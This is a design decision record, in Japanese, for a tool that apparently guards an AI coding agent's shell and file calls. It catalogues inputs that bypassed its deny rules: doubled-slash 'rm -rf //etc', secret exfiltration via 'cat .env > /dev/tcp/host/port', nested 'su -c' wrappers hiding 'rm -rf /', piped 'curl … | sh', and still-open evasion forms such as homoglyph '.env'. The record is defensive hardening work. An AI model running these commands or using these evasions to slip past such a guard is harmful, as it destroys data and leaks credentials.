# ADR 0002 — 機密 path / rm / dev/tcp バイパス (2026-06)

## Status

Accepted (2026-06-07).

## Context

2026-06 のルール品質レビューで、ADR 0001・open-issues・substantive-test-checklist
のいずれにも未記載だった入力形を 3 件 (A1–A3) 確認した。いずれも「ルール網羅
から漏れた分類」であり、hard_deny ルールが発火する前段の facts / regex 層の穴
に帰着する。

| ID | 穴 | 重大度 |
| --- | --- | --- |
| A1 | 絶対パス機密ディレクトリ (`/home/user/.aws/...`) が `$HOME` 必須 regex を素通り | P0 |
| A2 | `rm -rf //etc` 等の先頭多重スラッシュが文字列等価判定を回避 | P1 |
| A3 | `cat .env > /dev/tcp/host/port` が head ベース network sink 判定を回避 | P1 |

同レビューで既知ギャップ (B 群) のうち、次の 2 件を本イテレーションで塞ぐ。

| ID | 穴 | 重大度 |
| --- | --- | --- |
| B3 | 権限昇格ラッパー 3 段 (`su -c 'bash -c "su -c ..."'`) が `nesting_budget=2` で取り逃し | P2 |
| B4 | plugin DSL `shell.pipeline` が `inner_argv` 内 pipeline を見ない | P2 |

## Decision

### A1 — 絶対パス機密ディレクトリ (PR #119)

`SENSITIVE_PATH` (`src/rules/patterns.rs`) と `facts::sensitive` の 5 ディレクトリ
regex (`SSH_DIR` 等) の prefix を `(?:^|/|\s|(?:~|$HOME|${HOME})/)` に統一する。
2 系統の source-of-truth を両方修正しないと Bash 経路とファイルツール経路の
どちらかが残る。

### A2 — rm パス正規化 (PR #120)

`destructive_rm::normalize_rm_target` で連続スラッシュ畳み込みと末尾 `/` 除去。
`..` セグメントは悲観的に destructive 扱い (shell 展開前は解決不能)。

### A3 — `/dev/tcp` redirect sink (PR #120)

`sensitive_net::redirect_target_is_network` を追加し、書き込み redirect 先が
`/dev/(tcp|udp)/` にマッチする場合を network sink とみなす。

### B3 — `nesting_budget` 3 へ引き上げ

`src/facts/shell.rs::NESTING_BUDGET` を `3` に固定する。3 段ラッパー
(`su -c 'bash -c "su -c '\''rm -rf /'\''"'`) まで `inner_argv` を展開し、
`destructive-rm` 等の既存 rule が最深層を見られるようにする。4 段超は
引き続き上限で打ち切る。

### B4 — plugin `shell.pipeline` × `inner_argv`

`WhenNode::ShellPipelineFromTo` 評価で各 `Argv` の `inner_argv` を再帰走査し、
`from→to` の通過状態 (`seen_from`) を引き継ぐ。builtin `remote-script-pipe` も
`inner_argv` 上の fetcher→interpreter 順序列を走査し、plugin / builtin の
評価経路を揃える。

## Consequences

### Positive

- Claude Code が渡す絶対 `file_path` で hard_deny 機密ルールが発火する。
- POSIX 同一パス (`//etc`) の rm bypass が塞がれる。
- bash 疑似ソケットへの機密流出が Critical Deny になる。
- 3 段ラッパー内の `rm -rf /` が `destructive-rm` で deny される。
- `su -c 'curl … | sh'` が plugin `shell.pipeline` と builtin remote-pipe の
  両方で捕捉される。

### Negative

- `nesting_budget` 引き上げは深ネスト入力の parse コストをわずかに増やす
  (線形、CLI 1 起動 1 回のため実害は小さい)。
- `inner_argv` 走査はフラット化された順序列に依存する。複数 segment に
  跨る inner pipeline は引き続き segment 境界で分断される。

### Known limitations (本イテレーション外)

- B1 Unicode homoglyph `.еnv` (GAP-01)
- B2 Bash token symlink (GAP-15)
- B5 `echo $(cat .env)` — cmdsubst opaque 化 (GAP-01)
- C2 `$CMD .env` 変数 head 隠蔽
- ~~C3 `rm -rf /e*` glob 展開前 bypass~~ — 解消 (ADR 0006)

## Implementation map

| 項目 | ファイル | 主要変更 |
| --- | --- | --- |
| A1 | `src/rules/patterns.rs`, `src/facts/sensitive.rs` | 絶対パス anchor 拡張 |
| A2 | `src/rules/destructive_rm.rs` | `normalize_rm_target` |
| A3 | `src/rules/sensitive_net.rs` | `redirect_target_is_network` |
| B3 | `src/facts/shell.rs` | `NESTING_BUDGET = 3` |
| B4 | `src/plugin/dsl.rs`, `src/rules/remote_pipe.rs` | `inner_argv` 再帰走査 |
| Tests | `tests/bypass/corpus.jsonl`, unit tests | GAP-20/21/22, GAP-02/03 昇格 |
| Doc | `docs/design/policy-packs.md`, 本 ADR | 設計追従 |
